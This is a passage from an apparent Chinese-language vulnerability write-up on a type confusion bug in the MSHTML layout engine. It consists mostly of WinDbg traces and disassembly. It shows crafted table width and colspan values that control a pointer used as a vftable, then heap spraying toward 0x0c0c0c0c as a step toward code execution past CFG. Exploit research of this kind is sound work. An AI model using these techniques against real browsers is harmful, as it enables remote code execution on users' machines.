<span class="nt">6968fc82</span> <span class="nt">e86df072ff</span>      <span class="nt">call</span>    <span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">Patchable</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">PatchableArrayData</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">::</span><span class="nd">Readable</span> <span class="o">(</span><span class="nt">68dbecf4</span><span class="o">)</span>
<span class="nt">0</span><span class="p">:</span><span class="nd">007</span><span class="p">:</span><span class="nd">x86</span><span class="o">&gt;</span> <span class="nt">r</span><span class="o">//</span><span class="nt">第二次命中时</span><span class="err">，</span><span class="nt">注意ecx寄存器的值</span><span class="err">，</span><span class="nt">0x0980a690</span>
<span class="nt">eax</span><span class="o">=</span><span class="nt">0980a570</span> <span class="nt">ebx</span><span class="o">=</span><span class="nt">0980a690</span> <span class="nt">ecx</span><span class="o">=</span><span class="nt">0980a690</span> <span class="nt">edx</span><span class="o">=</span><span class="nt">00000000</span> <span class="nt">esi</span><span class="o">=</span><span class="nt">00000064</span> <span class="nt">edi</span><span class="o">=</span><span class="nt">69adc680</span>
<span class="nt">eip</span><span class="o">=</span><span class="nt">6968fc82</span> <span class="nt">esp</span><span class="o">=</span><span class="nt">088abb28</span> <span class="nt">ebp</span><span class="o">=</span><span class="nt">088abb54</span> <span class="nt">iopl</span><span class="o">=</span><span class="nt">0</span>         <span class="nt">nv</span> <span class="nt">up</span> <span class="nt">ei</span> <span class="nt">pl</span> <span class="nt">nz</span> <span class="nt">na</span> <span class="nt">po</span> <span class="nt">nc</span>
<span class="nt">cs</span><span class="o">=</span><span class="nt">0023</span>  <span class="nt">ss</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">ds</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">es</span><span class="o">=</span><span class="nt">002b</span>  <span class="nt">fs</span><span class="o">=</span><span class="nt">0053</span>  <span class="nt">gs</span><span class="o">=</span><span class="nt">002b</span>             <span class="nt">efl</span><span class="o">=</span><span class="nt">00000202</span>
<span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">MultiColumnBoxBuilder</span><span class="p">::</span><span class="nd">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="nt">0x2c3d31</span><span class="o">:</span>
<span class="nt">6968fc82</span> <span class="nt">e86df072ff</span>      <span class="nt">call</span>    <span class="nt">MSHTML</span><span class="o">!</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">Patchable</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">PatchableArrayData</span><span class="o">&lt;</span><span class="nt">Layout</span><span class="p">::</span><span class="nd">SGridBoxItem</span><span class="o">&gt;</span> <span class="o">&gt;</span><span class="p">::</span><span class="nd">Readable</span> <span class="o">(</span><span class="nt">68dbecf4</span><span class="o">)</span>
</pre></div>


<p>果然第二次命中的时候，是一个int Array Object。因此，这个漏洞就是由于Layout::Patchable<Layout::PatchableArrayData<Layout::SGridBoxItem> &gt;::Readable函数是处理虚表对象的函数，但是由于boom()函数中引用th1.align导致Readable函数第二次引用，由于没有对对象属性进行检查，导致第二次会将table对象传入。</p>
<p>这就是一个典型的Type Confusion。</p>
<p>而Readable会将这个对象当作虚表对象处理，而这个int Array维度对象我们可以控制，从而通过控制Readable返回值来达到代码执行。</p>
<hr />
<h3>Exploitation Surface</h3>
<p>如果想利用这个漏洞，我们需要分析一下攻击面，首先是我们可控的位置是什么（也就是在之前我提到的int Array的维度），这个可控的位置是否有利用点，有哪些防护，是否有可能绕过等等。</p>
<p>首先我们来看一下利用位置的上下文。</p>
<div class="codehilite"><pre><span></span><span class="nf">cmp</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="p">],</span><span class="mi">0</span> 
<span class="no">je</span>      <span class="no">MSHTML</span><span class="p">!</span><span class="no">Layout</span><span class="p">::</span><span class="no">MultiColumnBoxBuilder</span><span class="p">::</span><span class="no">HandleColumnBreakOnColumnSpanningElement</span><span class="err">+</span><span class="mi">0x2c3d83</span>
<span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">ebx</span>
<span class="nf">call</span>    <span class="no">MSHTML</span><span class="p">!</span><span class="no">Layout</span><span class="p">::</span><span class="no">Patchable</span><span class="err">&lt;</span><span class="no">Layout</span><span class="p">::</span><span class="no">PatchableArrayData</span><span class="err">&lt;</span><span class="no">Layout</span><span class="p">::</span><span class="no">SGridBoxItem</span><span class="err">&gt;</span> <span class="err">&gt;</span><span class="p">::</span><span class="no">Readable</span>
<span class="nf">mov</span>     <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebp-10h</span><span class="p">],</span><span class="no">esp</span>
<span class="nf">mov</span>     <span class="no">ebx</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="p">]</span>
<span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">ebx</span><span class="p">]</span>
<span class="nf">mov</span>     <span class="no">edi</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">eax</span><span class="err">+</span><span class="mi">1</span><span class="no">A4h</span><span class="p">]</span>
<span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">edi</span>
<span class="nf">call</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">MSHTML</span><span class="p">!</span><span class="no">__guard_check_icall_fptr</span><span class="p">]</span>
<span class="nf">mov</span>     <span class="no">ecx</span><span class="p">,</span><span class="no">ebx</span>
<span class="nf">call</span>    <span class="no">edi</span>
</pre></div>


<p>可看到，在eax作为指针返回后，会在后续继续调用到一个Readable函数，而在这个函数后返回后，eax会连续传递，最后调用到call edi，引用这个虚函数。</p>
<p>也就是说，一旦我们可以控制这个指针，我们就有可能在call edi位置达到代码执行的效果。</p>
<p>而可以看到，在call edi之前，有一处call __guard_check_icall_fptr，这是Windows新的防护机制CFG，在执行虚函数调用前，会检查虚函数。</p>
<p><img alt="./20170314/1.png" src="https://images.seebug.org/content/images/2017/03/1-2.png-w331s" /></p>
<p>因此，我们简单分析一下我们的攻击面，首先我们可控的位置是int Array Object+0x4位置的值，这个值控制范围有限，因此我们似乎不能通过这种方法来获得任意地址的读写能力，因此对于我们来说ASLR对于这个漏洞来说不好绕过。ASLR和DEP不好绕过。</p>
<p>接下来，我们要分析的就是，如何控制这个值。这个对象经过我们刚才的分析，是由MSHTML!Array<Math::SLayoutMeasure>::Create函数创建的对象，但赋值并非在这个位置。在分析的过程中，我对Layout中的大量类函数进行了跟踪分析，这里我将通过正向来直接跟大家展示这个值是从什么位置来的。</p>
<hr />
<h3>跟踪TableBoxBuilder结构体</h3>
<p>这里，我们稍微修改一下PoC，主要是对th1对象中的width值进行修改。</p>
<div class="codehilite"><pre><span></span><span class="nt">&lt;th</span> <span class="na">id=</span><span class="s">&quot;th1&quot;</span> <span class="na">colspan=</span><span class="s">&quot;5&quot;</span> <span class="na">width=</span><span class="s">10000</span><span class="nt">&gt;&lt;/th&gt;</span>
</pre></div>


<p>下面调试过程中，由于多次重启，堆地址值有所变化，但不影响分析。</p>
<p>首先，我们要关注的是一个名为FlowBoxBuilder的对象，这个对象偏移＋0x124的位置将会存放Width值生成的一个size。在Layout::FlowBoxBuilder::FlowBoxBuilder函数中，这个结构体对象被创建。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">FlowBoxBuilder</span><span class="o">::</span><span class="n">FlowBoxBuilder</span><span class="o">+</span><span class="mh">0xe</span><span class="o">:</span>
<span class="mi">67</span><span class="n">c70ae4</span> <span class="mi">8</span><span class="n">bd9</span>            <span class="n">mov</span>     <span class="n">ebx</span><span class="o">,</span><span class="n">ecx</span><span class="c1">//对象位置被初始化</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span> <span class="n">ecx</span>
<span class="n">ecx</span><span class="o">=</span><span class="mi">09</span><span class="n">a42ad8</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">09</span><span class="n">a42ad8</span><span class="o">+</span><span class="mi">124</span><span class="c1">//对应位置的成员变量已经被初始化</span>
<span class="mi">09</span><span class="n">a42bfc</span>  <span class="n">e0e0e0e0</span> <span class="n">e0e0e0e0</span> <span class="n">e0e0e0e0</span> <span class="n">e0e0e0e0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">ba</span> <span class="n">w1</span> <span class="mi">09</span><span class="n">a42ad8</span><span class="o">+</span><span class="mi">124</span> <span class="c1">//对＋0x124位置下写入断点</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">4</span> <span class="n">hit</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">FlowBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x11b</span><span class="o">:</span>
<span class="mi">67</span><span class="n">b18c75</span> <span class="n">f3a5</span>            <span class="n">rep</span> <span class="n">movs</span> <span class="n">dword</span> <span class="n">ptr</span> <span class="n">es</span><span class="o">:[</span><span class="n">edi</span><span class="o">],</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">esi</span><span class="o">]</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">09</span><span class="n">a42ad8</span><span class="o">+</span><span class="mi">124</span><span class="c1">//可以看到在InitializeBoxSizing函数中被赋值</span>
<span class="mi">09</span><span class="n">a42bfc</span>  <span class="mi">00989680</span><span class="o">=</span><span class="mi">1000000</span>
</pre></div>


<p>可以看到，在MSHTML!Layout::FlowBoxBuilder::InitializeBoxSizing函数中，FlowBoxBuilder+0x124位置被赋值。赋值的内容是0x989680，就是1000000，这个值又是从哪里来的呢？在MSHTML中有一个函数MSHTML!Layout::ContainerBoxBuilder::ComputeBoxModelForChildWithUsedWidth，这个计算会将table的width＊100。</p>
<p>如上面的代码片段，FlowBoxBuilder在InitializeBoxSizing中初始化之后，偏移＋0x124位置会将ComputeBoxModelForChildWithUsedWidth函数的计算值保存。</p>
<p>随后这个值会加上200，之后这个值回存入结构体中，然后会存放在FlowBoxBuilder结构体＋0x114的位置。</p>
<div class="codehilite"><pre><span></span>67b0201a 8906            mov     dword ptr [esi],eax
0:007:x86&gt; g
Breakpoint 7 hit
MSHTML!TSmartPointer&lt;Tree::TextBlock&gt;::operator=+0x13:
67b0201c 85c9            test    ecx,ecx
0:007:x86&gt; dd 09b40948+114//
09b40a5c  09b778d0 00000000 e0e0e0e0 00000000//在FlowBoxBuilder+0x114位置存放了一个结构体
09b40a6c  00989874 //+200之后依然存放在FlowBoxBuilder+0x124的位置 
0:007:x86&gt; dd 09b778d0
09b778d0  67e6c574 00000001 09b36560 09b6f968//结构体＋0xc位置存放着目标结构体，这个结构体其实就是一个int Array结构，这个结构会在后续调用中用到。
09b778e0  00989874 
0:007:x86&gt; dd 09b6f968
09b6f968  00000000 001e84a8 003d0950 005b8df8
09b6f978  007a12a0 00989748 a0a0a0a0 a0a0a0a0
09b6f988  00000000 00000000 4c762d5c 000c2ca7
09b6f998  09b5a4a8 09b71a68 f0f0f0f0 f0f0f0f0
09b6f9a8  f0f0f0f0 f0f0f0f0 a0a0a0a0 a0a0a0a0
09b6f9b8  00000000 00000000 59752d4a 140c2caa
09b6f9c8  abcdaaaa 80411000 00000044 0000006c
09b6f9d8  09b6fa58 09b6f910 04d67e6c dcbaaaaa
0:007:x86&gt; kb//调用逻辑
ChildEBP RetAddr  Args to Child              
08efb8f4 67e6c0fc 09b778d0 08efbd54 09b409d0 MSHTML!TSmartPointer&lt;Tree::TextBlock&gt;::operator=+0x13
08efb940 67e6c03e 090b82f8 09b40900 09b40a20 MSHTML!Layout::SBoxModel::CalculateFullBoxModelForTable+0x9f
08efb9bc 67b1a3dc 090b82f8 09b40900 09b40a20 MSHTML!Layout::SBoxModel::CalculateFullBoxModel+0x270
08efbac4 67b12365 08efbd54 0001f400 08efbcec MSHTML!Layout::FlowBoxBuilder::BuildBoxItem+0x25a
</pre></div>


<p>到此，我们完成了对FlowBoxBuilder结构体关键成员变量的赋值，这个成员变量会在后续调用中，进入很关键的TableBoxBuilder结构体，我们关键的Array位置存放在FlowBoxBuilder+0x114的指针内偏移为+0xc的指针处，接下来我们进入TableBoxBuilder类函数跟踪。</p>
<p>+0xc的这个Array会在TableBoxBuilder::InitialBoxSizing函数中交给TableBoxBuilder结构体+0x294的位置。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x5c</span><span class="o">:</span>
<span class="mi">67</span><span class="n">e766ac</span> <span class="mi">8</span><span class="n">d460c</span>          <span class="n">lea</span>     <span class="n">eax</span><span class="o">,[</span><span class="n">esi</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="o">]//</span><span class="n">esi存放的就是FlowBoxBuilder</span><span class="o">+</span><span class="mh">0x114</span><span class="err">的指针</span>
<span class="c1">//+0xc位置存放的就是Array结构体</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x5f</span><span class="o">:</span>
<span class="mi">67</span><span class="n">e766af</span> <span class="mi">50</span>              <span class="n">push</span>    <span class="n">eax</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x60</span><span class="o">:</span>
<span class="mi">67</span><span class="n">e766b0</span> <span class="mi">8</span><span class="n">d8b94020000</span>    <span class="n">lea</span>     <span class="n">ecx</span><span class="o">,[</span><span class="n">ebx</span><span class="o">+</span><span class="mi">294</span><span class="n">h</span><span class="o">]//</span><span class="n">ebx存放的是TableBoxBuilder</span><span class="o">+</span><span class="mh">0x294</span><span class="err">的指针地址</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//调用SArray::operator</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x66</span><span class="o">:</span>
<span class="mi">67</span><span class="n">e766b6</span> <span class="n">e879e6c4ff</span>      <span class="n">call</span>    <span class="n">MSHTML</span><span class="o">!</span><span class="n">SArray</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableGridBox</span><span class="o">::</span><span class="n">SRowGroupInfo</span><span class="o">&gt;::</span><span class="n">operator</span><span class="o">=</span> <span class="o">(</span><span class="mi">67</span><span class="n">ac4d34</span><span class="o">)//</span><span class="n">esi</span><span class="o">+</span><span class="mi">0</span><span class="n">c</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">0963</span><span class="n">ba2c</span><span class="c1">//esi+0xc的值</span>
<span class="mi">0963</span><span class="n">ba2c</span>  <span class="mi">00</span><span class="n">a2beb0</span> <span class="mi">00000000</span> <span class="n">e0e0e0e0</span> <span class="mi">00000000</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">a2beb0</span>
<span class="mi">00</span><span class="n">a2beb0</span>  <span class="mi">00000000</span> <span class="mi">001</span><span class="n">e84a8</span> <span class="mi">003</span><span class="n">d0950</span> <span class="mi">005</span><span class="n">b8df8</span>
<span class="mi">00</span><span class="n">a2bec0</span>  <span class="mi">007</span><span class="n">a12a0</span> <span class="mi">00989748</span> <span class="n">a0a0a0a0</span> <span class="n">a0a0a0a0</span>
</pre></div>


<p>在MSHTML!SArray<Layout::TableGridBox::SRowGroupInfo>::operator函数中，会完成对TableBoxBuilder+0x294位置的赋值，就是将上面代码中esi+0xc的值，交给TableBoxBuilder+0x294。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="n">Breakpoint</span> <span class="mi">4</span> <span class="n">hit</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">SArray</span><span class="o">&lt;</span><span class="n">Math</span><span class="o">::</span><span class="n">SLayoutMeasure</span><span class="o">&gt;::</span><span class="n">operator</span><span class="o">=+</span><span class="mh">0x1a</span><span class="o">:</span>
<span class="mi">67</span><span class="n">ac4d4e</span> <span class="mi">85</span><span class="n">c9</span>            <span class="n">test</span>    <span class="n">ecx</span><span class="o">,</span><span class="n">ecx</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">09</span><span class="n">d7ff30</span><span class="o">+</span><span class="mi">294</span><span class="c1">//偏移294位置存放着TableBoxBuilder中的size部分，用于赋值给Type Confusion的对象</span>
<span class="mi">09</span><span class="n">d801c4</span>  <span class="mi">09</span><span class="n">d7da30</span> <span class="mi">00000000</span> <span class="n">e0e0e0e0</span> <span class="mi">00000000</span>
<span class="mi">09</span><span class="n">d801d4</span>  <span class="mi">00000000</span> <span class="n">a0a0a0a0</span> <span class="n">a0a0a0a0</span> <span class="mi">09</span><span class="n">d7f868</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mi">09</span><span class="n">d7da30</span><span class="c1">//已经完成了Size的赋值操作</span>
<span class="mi">09</span><span class="n">d7da30</span>  <span class="mi">00000000</span> <span class="mi">001</span><span class="n">e84a8</span> <span class="mi">003</span><span class="n">d0950</span> <span class="mi">005</span><span class="n">b8df8</span>
<span class="mi">09</span><span class="n">d7da40</span>  <span class="mi">007</span><span class="n">a12a0</span> <span class="mi">00989748</span> <span class="n">a0a0a0a0</span> <span class="n">a0a0a0a0</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">kb</span>
<span class="n">ChildEBP</span> <span class="n">RetAddr</span>  <span class="n">Args</span> <span class="n">to</span> <span class="n">Child</span>              
<span class="mi">08</span><span class="n">e7b878</span> <span class="mi">67</span><span class="n">e766bb</span> <span class="mi">09</span><span class="n">da48bc</span> <span class="mi">08</span><span class="n">e7bbbc</span> <span class="mi">08</span><span class="n">e7b8a8</span> <span class="n">MSHTML</span><span class="o">!</span><span class="n">SArray</span><span class="o">&lt;</span><span class="n">Math</span><span class="o">::</span><span class="n">SLayoutMeasure</span><span class="o">&gt;::</span><span class="n">operator</span><span class="o">=+</span><span class="mh">0x1a</span>
<span class="mi">08</span><span class="n">e7b890</span> <span class="mi">67</span><span class="n">ccb346</span> <span class="mi">051</span><span class="n">d2fd8</span> <span class="mi">051</span><span class="n">d2f88</span> <span class="mi">09</span><span class="n">da48b0</span> <span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">TableBoxBuilder</span><span class="o">::</span><span class="n">InitializeBoxSizing</span><span class="o">+</span><span class="mh">0x6b</span>
</pre></div>


<p>在最后漏洞触发位置的MSHTML!Layout::TableGridBox::InitializeColumnData函数中，会完成对我们漏洞触发位置的Type Confusion的结构体内容的赋值。</p>
<div class="codehilite"><pre><span></span>6912e226 8b8394020000    mov     eax,dword ptr [ebx+294h] ds:002b:0924592c=09245598  //what is ebx and ebx+294  ebx is struct Layout::TableBoxBuilder
6912e22c 8b0e            mov     ecx,dword ptr [esi]//获取我申请的堆指针
6912e22e 8b0490          mov     eax,dword ptr [eax+edx*4]//计算TableBoxBuilder对应294位置的值+索引*sizeof
6912e231 890491          mov     dword ptr [ecx+edx*4],eax//将这个值交给申请堆指针对应索引的位置
6912e234 42              inc     edx//edx = edx+1//自加1
6912e235 3bd7            cmp     edx,edi//check lenth 检测是否已经到达我申请的堆大小
6912e237 7ced            jl      MSHTML!Layout::TableGridBox::InitializeColumnData+0x6c (6912e226)
</pre></div>


<p>可能大家这个时候有点乱了，下面我将用一个流程图来展示一下结构体的赋值过程。大致就是首先会通过计算获得Width的一个size，计算方法是:Width*100+200，随后，会将这个值保存在一个Array里，这个Array的大小后面会讲到。之后会将这个Array存入一个指针偏移＋0xc的位置，交给FlowBoxBuilder结构体＋0x114的位置。之后，会赋值给TableBoxBuilder结构体＋0x294位置，最后会交给漏洞触发位置申请的堆指针。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/03/5.png-w331s" /></p>
<p>而经过我们上面的分析，产生漏洞的位置在这个Array+0x4位置，我们也需要通过table的条件控制这个位置的值，才能达到利用。</p>
<hr />
<h3>控制Array结构到漏洞利用</h3>
<p>通过上面的跟踪，我们知道了id=th1的Table中的Width可以控制一个Array结构，但是我们也发现Array结构并非单独只包含一个Width计算得到的值。</p>
<div class="codehilite"><pre><span></span>0:007:x86&gt; dd 9bc7038
<span class="nt">&lt;th</span> <span class="na">id=</span><span class="s">&quot;th1&quot;</span> <span class="na">colspan=</span><span class="s">&quot;5&quot;</span> <span class="na">width=</span><span class="s">1000</span><span class="nt">&gt;&lt;/th&gt;</span>//
09bc7038  00000000 00004e48 00009c90 0000ead8
09bc7048  00013920 00018768 a0a0a0a0 a0a0a0a0
</pre></div>


<p>可以看到，Array结构是有一个大小的，其实，这个Array中存放的值，取决于width，而大小取决于colspan，这个colspan为5的情况下，Array中存放了5个值，而我们需要控制的是Array+0x4这个位置的值，这样的话，我们将colspan的大小修改为1，并且修改Width的值。</p>
<div class="codehilite"><pre><span></span><span class="nt">&lt;th</span> <span class="na">id=</span><span class="s">&quot;th1&quot;</span> <span class="na">colspan=</span><span class="s">&quot;1&quot;</span> <span class="na">width=</span><span class="s">2021159</span><span class="nt">&gt;&lt;/th&gt;</span>

0:005:x86&gt; t
MSHTML!Layout::Patchable<span class="nt">&lt;Layout::PatchableArrayData</span><span class="err">&lt;Layout::SGridBoxItem</span><span class="nt">&gt;</span> &gt;::Readable:
67afecf4 8b15fc5cb368    mov     edx,dword ptr [MSHTML!_tls_index (68b35cfc)] ds:002b:68b35cfc=00000002
0:005:x86&gt; p
MSHTML!Layout::Patchable<span class="nt">&lt;Layout::SharedBoxReferenceDataMembers&gt;</span>::Readable+0x6:
67afecfa 64a12c000000    mov     eax,dword ptr fs:[0000002Ch] fs:0053:0000002c=00000000
0:005:x86&gt; p
MSHTML!Layout::Patchable<span class="nt">&lt;Layout::SharedBoxReferenceDataMembers&gt;</span>::Readable+0xc:
67afed00 8b0490          mov     eax,dword ptr [eax+edx*4] ds:002b:008f5dd0=008f0fb8
0:005:x86&gt; dd ecx//ecx存放的是Array
098563c8  00000000 0c0c0c04 a0a0a0a0 a0a0a0a0
</pre></div>


<p>可以看到，通过修改Width和colspan，我们成功控制了Array+0x4位置的值，这样，在接下来由于TypeConfusion，会将这个int Array当成是vftable pointer返回，并继续执行。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//Layout::Patchable&lt;Layout::PatchableArrayData&lt;Layout::SGridBoxItem&gt;&gt;::Readable函数</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SharedBoxReferenceDataMembers</span><span class="o">&gt;::</span><span class="n">Readable</span><span class="o">+</span><span class="mh">0x1e</span><span class="o">:</span>
<span class="mi">67</span><span class="n">afed16</span> <span class="mi">83</span><span class="n">c010</span>          <span class="n">add</span>     <span class="n">eax</span><span class="o">,</span><span class="mi">10</span><span class="n">h</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">Patchable</span><span class="o">&lt;</span><span class="n">Layout</span><span class="o">::</span><span class="n">SharedBoxReferenceDataMembers</span><span class="o">&gt;::</span><span class="n">Readable</span><span class="o">+</span><span class="mh">0x21</span><span class="o">:</span>
<span class="mi">67</span><span class="n">afed19</span> <span class="n">c3</span>              <span class="n">ret</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">005</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d36</span><span class="o">://</span><span class="err">返回之后，</span><span class="n">eax成功变成了0c0c0c14的值</span>
<span class="mi">683</span><span class="n">cfc87</span> <span class="mi">833800</span>          <span class="n">cmp</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">],</span><span class="mi">0</span>    <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">0</span><span class="n">c0c0c14</span><span class="o">=</span><span class="mi">00000000</span>
</pre></div>


<p>可以看到，在返回后，我们可以成功控制这个返回指针了。接下来，我们利用heap spray来喷射堆，从而稳定控制0c0c0c0c位置的值。</p>
<p><img alt="./20170314/6.png" src="https://images.seebug.org/content/images/2017/03/6.png-w331s" /></p>
<hr />
<h3>CFG???从PoC到半个exploit</h3>
<p>到此，我们完成了对漏洞函数返回值的控制，在文章最开始的时候，我们看到这个指针的值中的成员变量，会作为虚函数在后续call调用中引用，在此之前，会有一处CFG check。</p>
<div class="codehilite"><pre><span></span><span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span><span class="c1">//eax已经被我们控制，跳转到喷射结束的堆中</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d45</span><span class="o">:</span>
<span class="mi">683</span><span class="n">cfc96</span> <span class="mi">8</span><span class="n">b18</span>            <span class="n">mov</span>     <span class="n">ebx</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">eax</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">0</span><span class="n">c0c0bb0</span><span class="o">=</span><span class="mi">0</span><span class="n">c0c0c0c</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
<span class="n">MSHTML</span><span class="o">!</span><span class="n">Layout</span><span class="o">::</span><span class="n">MultiColumnBoxBuilder</span><span class="o">::</span><span class="n">HandleColumnBreakOnColumnSpanningElement</span><span class="o">+</span><span class="mh">0x2c3d47</span><span class="o">:</span>
<span class="mi">683</span><span class="n">cfc98</span> <span class="mi">8</span><span class="n">b03</span>            <span class="n">mov</span>     <span class="n">eax</span><span class="o">,</span><span class="n">dword</span> <span class="n">ptr</span> <span class="o">[</span><span class="n">ebx</span><span class="o">]</span>  <span class="n">ds</span><span class="o">:</span><span class="mi">002</span><span class="n">b</span><span class="o">:</span><span class="mi">0</span><span class="n">c0c0c0c</span><span class="o">=</span><span class="mi">0</span><span class="n">c0c0c0c</span>
<span class="mi">0</span><span class="o">:</span><span class="mi">007</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">p</span>
